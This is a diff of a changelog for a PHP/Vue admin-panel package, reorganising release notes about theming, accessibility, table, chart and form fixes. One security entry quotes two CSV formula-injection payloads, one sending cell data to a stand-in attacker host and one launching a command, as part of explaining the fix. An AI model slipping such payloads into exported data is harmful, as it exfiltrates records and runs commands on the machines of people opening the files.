@@ -7,6 +7,118 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Added
+
+- **A panel's colours can say "good" and "careful" without hard-coding green and amber.**
+  `--success` and `--warning` join the semantic tokens, with foreground pairs and `--color-*`
+  aliases, and the ten places that reached for a literal Tailwind colour now read them. A panel
+  that themes its palette themes these too, in both schemes.
+- **A stat can say what its movement *means*, not just which way it went.**
+  `higherIsBetter()`, `lowerIsBetter()` and `sentiment(StatSentiment)` state whether a rise is
+  welcome. Revenue rising and error rate rising are the same arithmetic and opposite news, and
+  until now the widget assumed the first.
+- **Editor content is styled by the package rather than by the browser.** The rich and markdown
+  editors emitted `prose` classes for a typography plugin this package does not load, so a heading
+  inside an editor was whatever the browser's default said. `.panel-prose` styles that content from
+  the panel's own tokens, so it follows the theme and the appearance like everything else.
+- **Motion respects `prefers-reduced-motion`.** Transitions and animations on package-owned
+  surfaces collapse when the reader has asked for that, with loading spinners and skeletons
+  deliberately exempt: those communicate that work is still happening, which is the essential-motion
+  case rather than decoration.
+- **A real-browser verification harness, installing nothing.** `tests/browser` drives Chrome over
+  the DevTools Protocol from Node's own WebSocket client — no new dependency, no lockfile change,
+  and `npm run ci` is untouched. It exists because focus rings, target sizes and resolved styles are
+  answers only a layout engine gives, and source review kept having to guess at them.
+
+### Changed
+
+- **A stats trend with no declared meaning now renders neutral.** `trend()` used to set the arrow
+  and the colour from one argument, on the assumption that up is good — so an error rate rising
+  was drawn in green. Direction now drives the arrow and the wording; meaning drives the colour.
+
+  **Breaking:** every existing `trend()` call still compiles and still renders, and its colour
+  becomes neutral. A dashboard that used green and red to carry meaning stops carrying it until the
+  metric says which way is good. One method per stat restores it —
+  `higherIsBetter()` is exactly what the old behaviour assumed. See
+  [Breaking changes](docs/upgrading/breaking-changes.md).
+- **Controls meet a 44×44 touch target below the `sm` breakpoint.** The switch, the dialog close
+  and the icon-small button were between 16 and 32 CSS pixels of hit area on a phone. They grow
+  their target rather than their glyph, so nothing looks different on a desktop.
+
+### Fixed
+
+- **A panel's custom theme applies in dark mode, and reaches the overlays.** Three faults
+  compounded: the palette was resolved as "light, always", so a themed panel kept its light colours
+  in the dark; the resolved appearance was read from `matchMedia` rather than from reactive state,
+  so on `system` the stylesheet followed the operating system and everything computed from it did
+  not; and the palette was written to the shell, which every dialog, sheet, popover, select,
+  dropdown, tooltip and toast is teleported out of. The palette now follows the resolved appearance
+  and is written to the document element, so a portal inherits it. `PanelTheme` also gained
+  `sidebar-background`, the name the sidebar utilities actually resolve — `sidebar` set a variable
+  nothing read, and is still accepted.
+- **Several token pairs no longer put low-contrast text on their own background.** The corrected
+  ones are measured rather than eyeballed: the test parses the real stylesheet and computes the
+  ratios, so a future edit that regresses one fails here.
+- **Every form field is described by its own label, helper and error.** Fields generated ids from a
+  state path, so two entries of a repeater rendered the same `id` — a duplicate in the document,
+  and a label that pointed at whichever came first. Identity is now derived once and separated into
+  a DOM id and a state path, and a repeater entry carries its own scope. The state path is
+  unchanged, so `live()` and validation keys are unaffected.
+- **A repeater keeps each entry's identity when the list changes.** Collapsed state and item labels
+  were keyed by array index, so removing the first entry moved every collapse and every label onto
+  its neighbour. They follow the entry now. Removing an entry also leaves focus on a surviving one
+  rather than on nothing.
+- **A rejected submit moves focus to the first field that was rejected.** The error summary said
+  what was wrong and left the reader to find it, which on a long form is a scroll and a guess.
+- **Tabs, the appearance control and the password toggle work from the keyboard.** All three were
+  clickable and none was reachable in the way its role promised.
+- **The email verification countdown restarts when a code is resent.** It counted from mount, so a
+  second code left a timer describing the first.
+- **Header navigation exposes the destinations underneath a parent.** A group with children was a
+  button that went to the first of them, so the rest were unreachable from the header.
+- **Search is a combobox, and says what happened.** It was a text input beside a list of results
+  with nothing tying them together, and a request that failed looked exactly like a search that
+  matched nothing. Failure, emptiness, staleness and loading are now distinct — in the panel's
+  search and in a remote select.
+- **A table's rows line up with its header.** Selection checkboxes, the search row, group summaries
+  and the footer each counted the leading and trailing columns for themselves, so a table with row
+  selection *and* actions drew the footer one cell out. One computation now feeds all five.
+- **Sort direction is exposed, and rows can be reordered from the keyboard.** Reordering was a drag
+  handle and nothing else, which is a pointer-only feature; the same control is now also a menu.
+- **A chart's categories map to the right points.** A zero-based index was read against a one-based
+  value, so every label sat one place to the left, the first hit area was drawn off the left edge,
+  and the last category had no target at all — its data was on screen and unreachable by pointer or
+  keyboard. The chart also carries a textual equivalent of its data, and its series are told apart
+  by dash pattern as well as by colour.
+- **A stacked bar chart is scaled to its stacks.** Stacking worked; the axis did not know about it.
+  Two series of 60 and 120 make a column 180 tall, and the axis stopped at 120 — so the upper
+  segment was placed above the plot and drawn over whatever was there. Negative stacks failed from
+  the other end, each segment landing one full segment too low. The axis and the rectangles now
+  read the same running total.
+- **A repeater inside a repeater validates all the way down.** `schema()` takes any form component
+  and a repeater is one, but rule generation stopped one level in: a `required()` on a nested field
+  was accepted, rendered, serialized and never enforced. Dehydration always recursed, so nothing was
+  ever mass-assigned — the data was right and the guarantee was missing. Depth is not a parameter:
+  each level asks its children the same question.
+
+  **Behaviour change:** a nested entry that was incomplete used to save and now fails validation,
+  which is what the schema always said should happen. Only forms that actually nest a repeater are
+  affected, and only where a rule was being missed. See
+  [Breaking changes](docs/upgrading/breaking-changes.md).
+- **The rich editor shows where focus is and which formats are on.** Its toolbar buttons reported no
+  pressed state, and the editing surface itself drew no focus indicator.
+- **The panel's own interface text is translatable.** Twenty-two strings were English literals in
+  components, and one control built its accessible name by lower-casing a label — which produces
+  nothing meaningful in a language that does not work that way.
+
+#### A note on the accessibility work above
+
+Semantics, focus behaviour, resolved styles and target sizes are asserted against Chrome. Other
+engines are not covered, and announcement quality by a screen reader is not verified — no claim
+here rests on one.
+
+## [0.3.0] - 2026-09-09
+
 ### Security
 
 - **A relation group can decide who may write it.** `FormSchema::saveRelations()` wrote every
@@ -35,6 +147,21 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   click and neither sentence was shown. Destructive actions were written believing that guard was
   there. Every entry point — resource, relation, bulk, infolist — now shares one predicate.
 
+### Added
+
+- `live()` works on every surface that renders a form: create, edit, an action's form, a relation
+  form, and a relation action's form, through one context and one endpoint. `visible()` and
+  `hidden()` can read the form state, so a rebuild can change which fields exist.
+- `FormState`, `Get` and `Set` for reactive callbacks, with an explicit state patch so a server can
+  clear a child field that its parent has invalidated. Callbacks asking for none of them are called
+  exactly as before.
+- `Select::optionsUsing()` and `Select::modifyOptionsQueryUsing()` receive the form state, so a
+  searchable select can be scoped by a sibling field.
+- `Panel::brandName()` accepts a closure, and `Panel::tenantLabel()` names the current tenant —
+  both evaluated per render, and tenant identity is shown whether or not there is a switcher.
+- `ResourcePage::$submitLabel`, duplicate state-path detection, and a frontend/backend contract
+  version that reports drift with the command that fixes it.
+
 ### Fixed
 
 - **A `Select` bound to a cast enum no longer loses the value.** The form cast tested for string
@@ -54,57 +181,13 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   uploads, validation, and dehydration — without an application controller or routes.
 - `recordTitle()` falls back to the record key instead of assuming a `name` attribute.
 
-### Added
+## [0.1.9] - 2026-08-29
 
-- `live()` works on every surface that renders a form: create, edit, an action's form, a relation
-  form, and a relation action's form, through one context and one endpoint. `visible()` and
-  `hidden()` can read the form state, so a rebuild can change which fields exist.
-- `FormState`, `Get` and `Set` for reactive callbacks, with an explicit state patch so a server can
-  clear a child field that its parent has invalidated. Callbacks asking for none of them are called
-  exactly as before.
-- `Select::optionsUsing()` and `Select::modifyOptionsQueryUsing()` receive the form state, so a
-  searchable select can be scoped by a sibling field.
-- `Panel::brandName()` accepts a closure, and `Panel::tenantLabel()` names the current tenant —
-  both evaluated per render, and tenant identity is shown whether or not there is a switcher.
-- `ResourcePage::$submitLabel`, duplicate state-path detection, and a frontend/backend contract
-  version that reports drift with the command that fixes it.
+_No entries were recorded for this tag. It was cut on 2026-08-29 from a commit that
+descends from `v0.2.0` (2026-08-21), so `v0.1.9` contains everything `v0.2.0` does while
+sorting below it. See [Versioning policy](docs/upgrading/versioning.md)._
 
-
-- **`package.json` reaches the Composer archive, so `panel:install` can see the frontend
-  dependencies again.** `.gitattributes` carried `/package.json export-ignore`, and
-  `FrontendRequirements::npmPackages()` reads that file at runtime from inside `vendor/` to tell an
-  application which npm packages the published components import. In a dist install it found no
-  manifest, returned an empty list, and `panel:install` reported **no missing npm dependencies** —
-  which reads as "everything is installed" when in fact the check could not look. The one command
-  whose job is to name what is missing said nothing was.
-
-  Nothing in the suite caught it because the suite runs with this repository as the application,
-  where the file is always on disk. `Negative/DistributionTest` now asserts the archive attribute
-  directly, and `FrontendRequirements::hasNpmManifest()` separates "nothing is missing" from "I
-  could not look" so `panel:install` reports the second as a packaging fault rather than as good
-  news. `package-lock.json` stays export-ignored: an application resolves its own.
-- **CSV exports no longer execute what somebody typed into a text field.** A cell beginning with
-  `=`, `+`, `-`, `@`, a tab or a carriage return is a formula as far as Excel, LibreOffice and
-  Sheets are concerned, and they evaluate it when the file is opened —
-  `=HYPERLINK("http://attacker?x="&A1,"Click")` exfiltrates the row beside it, and
-  `=cmd|'/c calc'!A1` is worse. The attacker is anyone who can write a record field and the victim
-  is the administrator who opens the export, which is exactly the shape of an admin panel. CWE-1236.
-  Quoting never prevented it: CSV quoting is about parsing the file, not about what a cell means
-  once parsed. Such cells now carry a leading apostrophe, which every spreadsheet reads as "this is
-  text" and does not display. `Exporter::escapesFormulas()` turns it off for a feed another
-  *program* parses, where nothing evaluates anything and the apostrophe would be corruption rather
-  than a fix. XLSX was never affected — `Xlsx` writes `t="inlineStr"` cells, and a formula in that
-  format lives in an `<f>` element the writer does not emit.
-- Uploads are authorized by the form the field belongs to, and reading a resource is no longer
-  enough. `page=create` asks `create`, `page=edit` asks `update` on the named record, a relation
-  form asks the relation manager's own abilities per operation, and an action's form asks the
-  action. The endpoint previously accepted `canCreate() || canViewAny()`, so a read-only role
-  could write files to a disk.
-- The upload endpoint reads its context — resource, page, record, relation, action — from the
-  query string only. A form whose values happened to include a `resource` key could previously
-  point the upload at a different one.
-- `page` is an allowlist rather than "edit, or else create". An unrecognised value used to become
-  the create form, which is the one branch that needs no record.
+## [0.2.0] - 2026-08-21
 
 ### Added
 
@@ -138,6 +221,64 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   archive listing in the packaging guide was missing `lang/` and `package.json` — the second is
   read at runtime from inside `vendor/`, and `vitest.config.ts` is export-ignored alongside the
   rest of the toolchain now that the list has been checked.
+
+### Fixed
+
+- **Pinned columns work, and no longer take the table down with them.** Four faults, all in the
+  browser half of freezing, and each one alone was enough to make `frozen()` read as broken.
+
+  **The table threw at setup.** `useFrozenColumns` watches the frozen set, Vue evaluates a watch
+  source once to discover what it depends on, and that evaluation read `hasActionsColumn` — a
+  `const` declared further down `DataTable.vue`. A `ReferenceError` in the temporal dead zone,
+  before a single row was drawn. The two computed values now precede the frozen set, and a test
+  asserts the order rather than the symptom.
+
+  **Measuring looped back into the render that measured.** `measure(key)` returned a fresh closure
+  per render, which Vue treats as a new template ref and re-invokes on every patch — including the
+  patch the last invocation caused — and every invocation assigned a new widths object whether or
+  not a width had changed. Vue's "Maximum recursive updates exceeded", with nothing in the stack
+  naming the table. The ref callback is now stable per column key, does nothing when handed the
+  element it already holds, writes only when a width moved by at least half a pixel, measures in a
+  `requestAnimationFrame` rather than inside the ref callback, and cancels that frame on teardown.
+
+  **A pinned cell was see-through.** `bg-inherit` can only inherit what the row has, and the rows
+  had nothing — the summary footer was explicitly `bg-transparent` — so the scrolling columns
+  passed straight under the pinned ones. `TableRow` now defaults to an opaque `bg-background`, so
+  any table drawn with these primitives starts opaque, and the panel's own body rows add an opaque
+  hover on top of it, and `.panel-table-frozen-cell::before` paints a plate under the inherited colour for rows
+  that are legitimately tinted, such as a group band. The seam's own rules moved off
+  `[style*='right']` — which a column that declared a `width()` could defeat — onto
+  `panel-table-frozen-edge-start` / `-end` classes the renderer writes. All of it lives in the
+  published `panda-panel.css`, which the package build imports, so the shipped stylesheet is the
+  one that carries it.
+
+  **Pinning switched itself off on a phone for the wrong reason.** The guard summed the frozen
+  columns on *both* edges and compared the total to the visible width, so a pinned actions column
+  at the trailing edge unpinned the two identity columns at the leading edge — the columns that
+  make a narrow table readable at all. The sides are now evaluated separately, against the table's
+  scroll lane rather than the container around it, at 85% per side: a side that has all but
+  swallowed the lane still lets go, and it lets go alone. The lane is resolved through the same
+  `$el` unwrapping the cell refs use, because a ref that holds a *component* yields an undefined
+  `clientWidth` and a threshold that can never trigger. On a 360×800 viewport two identity columns
+  stay `position: sticky` through a horizontal scroll.
+
+  `resources/js/panel/tables/useFrozenColumns.test.ts` covers the arithmetic and the two
+  anti-regressions — a stable ref callback per key, and no state write for identical widths.
+  `npm run test:browser` drives a local Chrome at 360×800 against a fixture built from the real
+  component and the real stylesheet; it installs nothing, is not part of `npm run ci`, and is not a
+  browser test runner. See [Frozen and pinned columns](docs/tables/pinned-columns.md).
+
+## [0.1.8] - 2026-08-19
+
+_No entries were recorded for this tag._
+
+## [0.1.7] - 2026-08-19
+
+_No entries were recorded for this tag._
+
+## [0.1.6] - 2026-08-19
+
+### Added
 
 - **A reader can choose the language, and numbers and dates follow it.** The first three phases
   made the panel translatable; this one makes it switchable, and fixes the half that stayed
@@ -297,6 +438,10 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   reaches the Composer archive — a package that shipped without it would boot and then render
   `panda-panel::actions.delete.label` on the delete button.
 
+## [0.1.5] - 2026-08-18
+
+### Added
+
 - **A table can be drawn as a grid of cards.** `TableSchema::cards()` declares a card face and the
   toolbar grows a layout toggle; `?layout=grid` is whitelisted against the layouts the table offers,
   echoed in `state()['layout']`, and remembered by `persistColumnsInSession()`. It is a second
@@ -386,49 +531,6 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ### Fixed
 
-- **Pinned columns work, and no longer take the table down with them.** Four faults, all in the
-  browser half of freezing, and each one alone was enough to make `frozen()` read as broken.
-
-  **The table threw at setup.** `useFrozenColumns` watches the frozen set, Vue evaluates a watch
-  source once to discover what it depends on, and that evaluation read `hasActionsColumn` — a
-  `const` declared further down `DataTable.vue`. A `ReferenceError` in the temporal dead zone,
-  before a single row was drawn. The two computed values now precede the frozen set, and a test
-  asserts the order rather than the symptom.
-
-  **Measuring looped back into the render that measured.** `measure(key)` returned a fresh closure
-  per render, which Vue treats as a new template ref and re-invokes on every patch — including the
-  patch the last invocation caused — and every invocation assigned a new widths object whether or
-  not a width had changed. Vue's "Maximum recursive updates exceeded", with nothing in the stack
-  naming the table. The ref callback is now stable per column key, does nothing when handed the
-  element it already holds, writes only when a width moved by at least half a pixel, measures in a
-  `requestAnimationFrame` rather than inside the ref callback, and cancels that frame on teardown.
-
-  **A pinned cell was see-through.** `bg-inherit` can only inherit what the row has, and the rows
-  had nothing — the summary footer was explicitly `bg-transparent` — so the scrolling columns
-  passed straight under the pinned ones. `TableRow` now defaults to an opaque `bg-background`, so
-  any table drawn with these primitives starts opaque, and the panel's own body rows add an opaque
-  hover on top of it, and `.panel-table-frozen-cell::before` paints a plate under the inherited colour for rows
-  that are legitimately tinted, such as a group band. The seam's own rules moved off
-  `[style*='right']` — which a column that declared a `width()` could defeat — onto
-  `panel-table-frozen-edge-start` / `-end` classes the renderer writes. All of it lives in the
-  published `panda-panel.css`, which the package build imports, so the shipped stylesheet is the
-  one that carries it.
-
-  **Pinning switched itself off on a phone for the wrong reason.** The guard summed the frozen
-  columns on *both* edges and compared the total to the visible width, so a pinned actions column
-  at the trailing edge unpinned the two identity columns at the leading edge — the columns that
-  make a narrow table readable at all. The sides are now evaluated separately, against the table's
-  scroll lane rather than the container around it, at 85% per side: a side that has all but
-  swallowed the lane still lets go, and it lets go alone. The lane is resolved through the same
-  `$el` unwrapping the cell refs use, because a ref that holds a *component* yields an undefined
-  `clientWidth` and a threshold that can never trigger. On a 360×800 viewport two identity columns
-  stay `position: sticky` through a horizontal scroll.
-
-  `resources/js/panel/tables/useFrozenColumns.test.ts` covers the arithmetic and the two
-  anti-regressions — a stable ref callback per key, and no state write for identical widths.
-  `npm run test:browser` drives a local Chrome at 360×800 against a fixture built from the real
-  component and the real stylesheet; it installs nothing, is not part of `npm run ci`, and is not a
-  browser test runner. See [Frozen and pinned columns](docs/tables/pinned-columns.md).
 - **Four filter chips named their filter and then said nothing useful.** Indicators are built on the
   server precisely because only a filter knows what its value means — the rule the code states is
   that `1` is "Verified", not "1" — and four of the seven filters never used that knowledge.
@@ -444,62 +546,27 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   narrowing by — but it emitted on its own, and the server's answer resets the pending map. Filters
   set but not yet applied vanished without a word. The removal now travels in the same visit as
   whatever is staged.
-- **A schema that cannot mean what it says is now refused, loudly.** Six declaration mistakes were
-  silent, and all six produced wrong behaviour rather than no behaviour. `PanelSchemaException`
-  covers them, and every message names the offending name and the fix:
-  - **Two columns with the same name** serialized as two columns that then shared one key for the
-    cell value, the visibility state, the search term and the sort.
-  - **Two form fields with the same name** collapsed into one validation rule, so the other field
-    was rendered, filled in, submitted and discarded without a word.
-  - **Two actions with the same name in one set** gave the action endpoint a choice it resolved by
-    taking the first — so the second button always ran the first action.
-  - **An action with no `url()`, `action()`, `form()` or `modal()`** rendered a button that did
-    nothing when pressed.
-  - **`defaultSort()` naming a column the table does not have** was serialized and then dropped by
-    the sort whitelist, so the table fell back to its natural order with nothing to say why.
-  - **A column, field or action with an empty name.**
-  - **Two filters with the same name**, whose state is keyed by name in the query string, so the
-    second control wrote over the first one's value.
-  - **A widget column span that is neither a number nor `'full'`** — `'ful'` answered `1`, a
-    quarter of the width that was asked for, from a typo. Numbers out of range are still clamped:
-    99 is an ask and four is the honest answer, but a word is a mistake and clamping hides it.
-  - **A widget column span at a breakpoint this grid does not have** (`'sm'`, `'xxl'`) was skipped
-    in silence, so the line of configuration did nothing.
 
-  **Breaking:** these throw where they previously did nothing. An application carrying one of them
-  has a bug today and will get an exception at schema-build time after upgrading — which is at boot
-  or on first render, so a test suite finds it before a user does. See `docs/upgrade.md`.
-- **An exporter that declares the same column twice is refused.** The file would carry two
-  identical headings, and the column picker keys its selection by name — so choosing one chose both
-  and unchecking it removed neither. Export and import columns also refuse an empty name, like
-  every other named thing in a schema.
-- **A widget or form component that is not in the build-time registry says so, in development.**
-  Both registries answered null for an unknown name and the caller drew a neutral fallback, which
-  looks exactly like a component that rendered nothing — and the three reasons for it (a typo, a
-  file outside the globbed directory, a build that was not re-run) are indistinguishable from the
-  screen. They now warn once per name, naming the directory the component has to live in.
-- **A tenant relationship that is not a relationship is refused by name.** `$tenantRelationship`
-  was checked with `method_exists`, so a scope, an accessor or a plain helper passed and then
-  failed inside `whereHas` as "Call to a member function getRelated() on null" — an error about
-  Eloquent's internals naming neither the resource nor the property that pointed at it.
-- **An import fails once when the file has no column for a required one.** An unmapped required
-  column produced a validation failure on *every row* — "The email field is required", ten thousand
-  times — which is a true statement about the wrong thing. It now stops before reading a single
-  row, naming the missing columns and listing the headings the file actually has.
-- **A stale panel manifest says so, in development.** `panel:cache` writes a list of class names
-  and discovery then never runs — which is the point of it, and the trap: a resource added
-  afterwards simply is not in the panel. No route, no navigation entry, no error, and no way to
-  guess that `panel:clear` is the answer. The manifest now records a fingerprint of the discovery
-  paths (file count and newest mtime), and boot compares it. **Only when a manifest exists and only
-  outside production**, so it costs nothing in the case it is not for. The file gained a `panels`
-  key alongside `fingerprint`; a manifest written by an older version still loads unchanged, so an
-  upgrade does not need a cache clear to boot.
-- **A resource missing from the sidebar for want of a policy says so, in development.**
-  `Gate::allows()` denies when no policy exists, which is correct and indistinguishable from a
-  policy that considered the question and said no. When navigation drops a resource *and* the model
-  has no policy at all, the panel now logs once per model, naming the `make:policy` command and
-  `Panel::strictAuthorization()` — which already turns this into an exception everywhere the panel
-  asks, and which nobody finds by staring at a gap in a sidebar.
+## [0.1.4] - 2026-08-16
+
+### Security
+
+- **`package.json` reaches the Composer archive, so `panel:install` can see the frontend
+  dependencies again.** `.gitattributes` carried `/package.json export-ignore`, and
+  `FrontendRequirements::npmPackages()` reads that file at runtime from inside `vendor/` to tell an
+  application which npm packages the published components import. In a dist install it found no
+  manifest, returned an empty list, and `panel:install` reported **no missing npm dependencies** —
+  which reads as "everything is installed" when in fact the check could not look. The one command
+  whose job is to name what is missing said nothing was.
+
+  Nothing in the suite caught it because the suite runs with this repository as the application,
+  where the file is always on disk. `Negative/DistributionTest` now asserts the archive attribute
+  directly, and `FrontendRequirements::hasNpmManifest()` separates "nothing is missing" from "I
+  could not look" so `panel:install` reports the second as a packaging fault rather than as good
+  news. `package-lock.json` stays export-ignored: an application resolves its own.
+
+### Fixed
+
 - **The documented verification loop can now be run.** `composer run types:check`,
   `composer run lint:check`, `npm run types:check` and `npm run lint:check` appeared in the master
   document and in this repository's own agent skill, and none of the four has ever existed in
@@ -507,75 +574,27 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   `npm run typecheck` / `lint` / `format:check` / `build`. `Negative/DistributionTest` now reads
   every command out of the documentation's own bash blocks and fails when one is not a declared
   script.
-- **An icon that is not in the registry says so, in development.** `resolveIcon()` answered null
-  for an unknown name exactly as it does for no name, so a mistyped icon — or, far more often, one
-  declared in PHP after `php artisan panel:icons` was last run — drew nothing with no way to find
-  out why. It now warns once per name in development, naming the icon and the command that fixes
-  it. Production is unchanged: the icon is still simply absent, because this is a build problem
-  rather than a runtime one.
-- **A resource that forgets `$model` says so.** PHP answered `Typed static property
-  PandaPanel\Resources\Resource::$model must not be accessed before initialization`, which names
-  this framework's class rather than the resource that forgot, and does not say what to write. It
-  now names the resource and prints the line to add.
-- **Column spans no longer overflow their grid.** A span was clamped against the *declared* column
-  count, not the count at the breakpoint being rendered. A four-column form is two columns wide at
-  `md`, so `columnSpan(3)` and `columnSpan(4)` emitted `md:col-span-3` / `md:col-span-4` against two
-  tracks — `grid-column: span 4` creates the missing tracks implicitly, and the row overflowed
-  sideways. Spans are now clamped per breakpoint, and `columnSpanFull()` compiles to
-  `col-span-full` (`grid-column: 1 / -1`) rather than resolving to a number that is only right at
-  one width.
-- **`columns()` above four rendered one column.** Ten of the eleven `columns()` setters had no upper
-  bound, the renderer has literal classes for one to four, and anything else hit the one-column
-  fallback — the widest possible ask reported as the narrowest possible result, silently. Every
-  setter now clamps through `PandaPanel\Support\ColumnCount`.
-- **`FormSchema::columns()` had no effect.** The root count was serialized and then ignored: the
-  form renderer stacked its top-level nodes in a flex column, so a field asking for half a row got a
-  whole one. The root is now a grid like every other container. Layouts still take the full width,
-  so a form built out of sections is laid out exactly as before.
-- **The three grid class tables are one.** The form grid, the infolist node and the infolist
-  renderer each carried their own copy, and they had drifted — a four-column form dropped to two at
-  `md` while a four-column infolist stayed at four, so the same declaration laid out differently
-  depending on which drew it. All three now read `panel/lib/grid.ts`, whose tables
-  `FrontendContractTest` checks against the PHP clamp.
-- **Plugin version constraints are checked again.** `PluginCompatibility::PACKAGE` was left as
-  `panda-panel` when the composer package was renamed to `chocoalano/panel`, so
-  `InstalledVersions::getPrettyVersion()` threw on every call. The class reads that as "not
-  installed as a package" and answers null, and a null version skips the constraint — so every
-  `requiresPanel` a plugin declared had been passing unexamined, in every installation, since the
-  rename. The check itself was still there and would never have said no again.
-- **Panel pages declare their own layout.** All sixteen published pages relied on the application's
-  `app.ts` having a case for `panel/`, and nothing checked. Where it was missing every panel screen
-  rendered inside the starter kit's `AppLayout` — host sidebar, no panel navigation, registered
-  resources nowhere — at HTTP 200 with no error and no warning. They now carry
-  `defineOptions({ layout })`, so the wiring is not needed at all; auth pages carry
-  `PanelBlankLayout`, which adds nothing, because they already draw their own frame.
-  `panel:install` additionally reads `app.ts` and reports the one case the package cannot fix from
-  the inside — an unconditional `page.default.layout = AppLayout` — by file, line, and replacement.
-- **Broadcasting no longer assumes a broadcaster.** `Panel::$broadcasting` defaults to `true`, so
-  the server sent a channel to every signed-in user and the client called `echo()` on it. In an
-  application with no broadcaster that threw "Echo has not been configured" from inside
-  `onMounted`, which aborted the panel layout's mount and produced a cascade of
-  `Slot "default" invoked outside of the render function` warnings — none of which name a
-  broadcaster. `SharePanelData` now withholds the channel unless a broadcast connection is actually
-  configured (`BroadcastSupport::isConfigured()`), and `echo()` is wrapped so a frontend that never
-  called `configureEcho()` gets one development-only console warning instead of a broken screen.
-  **Behaviour change:** an application that broadcasts from PHP but has `BROADCAST_CONNECTION=null`
-  or `log` now gets no panel channel. That was already a connection no browser could subscribe to;
-  what changes is that the panel says so instead of failing at mount.
-- **The published TypeScript compiles in an application.** `usePanel` and `useNavigation` read
-  `usePage().props.<key>` and depended on a `declare module '@inertiajs/core'` augmentation
-  published into `resources/js/types/` — a directory the host already owns and already declares
-  things in. Where that did not take effect, `page.props` was `{}` and the *application's*
-  `vue-tsc` reported fourteen errors inside files nobody there wrote. The panel now reads its props
-  through `panel/types/shared.ts`, which needs no augmentation, and no longer ships a declaration
-  for `name`, `auth`, or `sidebarOpen` — those are the application's to declare.
-- **`FrontendRequirements` actually checks its host-module list.** A bare `''` in the extension list
-  meant `File::exists()` matched the *directory*, so `@/types` was satisfied by the folder this
-  package publishes into and could never fail — the same for `@/routes`. `.d.ts` and `/index.d.ts`
-  are now recognised (a starter kit writes `types/index.d.ts`), the bare match is gone, and
-  `@/types/ui` — imported by the panel's broadcasting and flash bridge, never shipped, never
-  listed — has been added. A new `FrontendContractTest` derives the list from the imports in the
-  published tree, so the next omission fails here rather than in somebody's build.
+
+## [0.1.2] - 2026-08-15
+
+_No entries were recorded for this tag._
+
+## [0.1.1] - 2026-08-15
+
+### Security
+
+- **CSV exports no longer execute what somebody typed into a text field.** A cell beginning with
+  `=`, `+`, `-`, `@`, a tab or a carriage return is a formula as far as Excel, LibreOffice and
+  Sheets are concerned, and they evaluate it when the file is opened —
+  `=HYPERLINK("http://attacker?x="&A1,"Click")` exfiltrates the row beside it, and
+  `=cmd|'/c calc'!A1` is worse. The attacker is anyone who can write a record field and the victim
+  is the administrator who opens the export, which is exactly the shape of an admin panel. CWE-1236.
+  Quoting never prevented it: CSV quoting is about parsing the file, not about what a cell means
+  once parsed. Such cells now carry a leading apostrophe, which every spreadsheet reads as "this is
+  text" and does not display. `Exporter::escapesFormulas()` turns it off for a feed another
+  *program* parses, where nothing evaluates anything and the apostrophe would be corruption rather
+  than a fix. XLSX was never affected — `Xlsx` writes `t="inlineStr"` cells, and a formula in that
+  format lives in an `<f>` element the writer does not emit.
 
 ### Added
 
@@ -652,6 +671,161 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   record. Each falls back to what the page said before, so nothing changes until one is declared.
   A custom page extending `ResourcePage` now gets the resource's plural label rather than no
   heading at all.
+
+### Changed
+
+- **An empty dashboard explains itself.** The first screen after an install used to be a dashed box
+  reading "No widgets on this dashboard" — true, and useless, and drawn with an icon that was not
+  in the registry so it rendered nothing at all. `DashboardGuide` replaces it: the two generator
+  commands with this panel already filled in and a copy button on each, plus links to the
+  destinations the panel already has, so a new panel is not a dead end. All of it reads props the
+  shell already shares, so an empty dashboard still costs no query.
+
+### Fixed
+
+- **A schema that cannot mean what it says is now refused, loudly.** Six declaration mistakes were
+  silent, and all six produced wrong behaviour rather than no behaviour. `PanelSchemaException`
+  covers them, and every message names the offending name and the fix:
+  - **Two columns with the same name** serialized as two columns that then shared one key for the
+    cell value, the visibility state, the search term and the sort.
+  - **Two form fields with the same name** collapsed into one validation rule, so the other field
+    was rendered, filled in, submitted and discarded without a word.
+  - **Two actions with the same name in one set** gave the action endpoint a choice it resolved by
+    taking the first — so the second button always ran the first action.
+  - **An action with no `url()`, `action()`, `form()` or `modal()`** rendered a button that did
+    nothing when pressed.
+  - **`defaultSort()` naming a column the table does not have** was serialized and then dropped by
+    the sort whitelist, so the table fell back to its natural order with nothing to say why.
+  - **A column, field or action with an empty name.**
+  - **Two filters with the same name**, whose state is keyed by name in the query string, so the
+    second control wrote over the first one's value.
+  - **A widget column span that is neither a number nor `'full'`** — `'ful'` answered `1`, a
+    quarter of the width that was asked for, from a typo. Numbers out of range are still clamped:
+    99 is an ask and four is the honest answer, but a word is a mistake and clamping hides it.
+  - **A widget column span at a breakpoint this grid does not have** (`'sm'`, `'xxl'`) was skipped
+    in silence, so the line of configuration did nothing.
+
+  **Breaking:** these throw where they previously did nothing. An application carrying one of them
+  has a bug today and will get an exception at schema-build time after upgrading — which is at boot
+  or on first render, so a test suite finds it before a user does. See `docs/upgrade.md`.
+- **An exporter that declares the same column twice is refused.** The file would carry two
+  identical headings, and the column picker keys its selection by name — so choosing one chose both
+  and unchecking it removed neither. Export and import columns also refuse an empty name, like
+  every other named thing in a schema.
+- **A widget or form component that is not in the build-time registry says so, in development.**
+  Both registries answered null for an unknown name and the caller drew a neutral fallback, which
+  looks exactly like a component that rendered nothing — and the three reasons for it (a typo, a
+  file outside the globbed directory, a build that was not re-run) are indistinguishable from the
+  screen. They now warn once per name, naming the directory the component has to live in.
+- **A tenant relationship that is not a relationship is refused by name.** `$tenantRelationship`
+  was checked with `method_exists`, so a scope, an accessor or a plain helper passed and then
+  failed inside `whereHas` as "Call to a member function getRelated() on null" — an error about
+  Eloquent's internals naming neither the resource nor the property that pointed at it.
+- **An import fails once when the file has no column for a required one.** An unmapped required
+  column produced a validation failure on *every row* — "The email field is required", ten thousand
+  times — which is a true statement about the wrong thing. It now stops before reading a single
+  row, naming the missing columns and listing the headings the file actually has.
+- **A stale panel manifest says so, in development.** `panel:cache` writes a list of class names
